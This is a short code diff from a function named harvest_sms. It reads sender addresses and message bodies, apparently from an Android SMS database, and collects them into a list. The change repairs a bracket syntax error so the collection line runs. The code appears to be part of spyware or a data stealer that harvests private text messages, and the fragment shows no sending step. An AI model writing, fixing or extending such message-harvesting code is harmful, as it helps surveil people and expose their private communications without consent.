@@ -124,7 +124,7 @@ def harvest_sms():
                 try:
                     body = cur.getString(cur.getColumnIndex("body")) or ""
                     addr = cur.getString(cur.getColumnIndex("address")) or "?"
-                    out.append("[%s] %s" % (addr, body.replace("\n", " ")[:160]])
+                    out.append("[%s] %s" % (addr, body.replace("\n", " ")[:160]))
                 except Exception:
                     pass
             cur.close()
